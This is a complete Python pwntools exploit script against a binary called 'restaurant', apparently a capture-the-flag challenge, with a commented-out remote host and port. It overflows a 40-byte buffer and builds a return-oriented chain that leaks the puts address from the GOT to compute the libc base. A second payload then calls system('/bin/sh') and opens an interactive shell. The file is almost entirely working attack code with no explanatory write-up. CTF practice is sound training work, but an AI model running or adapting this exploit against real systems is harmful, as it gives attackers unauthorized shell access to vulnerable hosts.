#!/usr/bin/env python3
from pwn import *
import pwn
import time, os, traceback, sys, os
import binascii, array
from textwrap import wrap
def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath]+argv, gdbscript=gdbscript, aslr=True, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv,aslr=True, *a, **kw)
# Set up the target binary and the remote server
binary = ELF('./restaurant')
binPath ="./restaurant"
libc = ELF('./libc.so.6')
io = process(binary.path)
gdbscript = '''
init-pwndbg
break *fill + 162
continue
'''.format(**locals())
p=start()
#p=remote('134.122.101.249',32497)
p.recvuntil(b'>')
p.sendline(b'1')
overflow = 40*b'A'
puts_binary = pwn.p64(binary.plt['puts'])
#print(puts_binary)
junk =p64(next(binary.search(b"")))
print(list(binary.search(b""))[0])
print(binascii.hexlify(junk[0:]).decode('ascii'))
binary_got = pwn.p64(binary.got['puts'])
binary_fill = pwn.p64(binary.symbols['fill'])
binary_printf = pwn.p64(binary.symbols['printf'])
#print(binary_fill)
overflow = 40*b'A'
popRDI = pwn.p64(0x00000000004010a3)
ret = pwn.p64(0x000000000040063e)
payload =  pwn.flat(
            [
                 overflow,
                 popRDI,
                 junk,
                 puts_binary,
                 popRDI,
                 binary_got,
                 puts_binary,
                 ret,
                 binary_fill 
                    ]
             )
p.sendlineafter("> ",payload)
print("payload is ", (binascii.hexlify(payload).decode('ascii')))
p.recvuntil(b'\n')
p.recvuntil(b'\n')
data2 = p.recvuntil(b'\n')
leaked_addr_puts_libc = u64((data2.strip()).ljust(8, b"\x00"))
print(hex(leaked_addr_puts_libc))
base_address_libc  =  leaked_addr_puts_libc - libc.symbols['puts']
print(hex(base_address_libc))
binsh_offset = next(libc.search(b'/bin/sh'))
system_offset = libc.symbols['system']
syscall = pwn.p64(base_address_libc+system_offset)
BINSH = pwn.p64(base_address_libc+binsh_offset)
payload = pwn.flat(
            [
                overflow,
                popRDI,
                BINSH,
                ret,
                syscall
                    ]
            )
p.sendlineafter("> ",payload)
p.interactive()
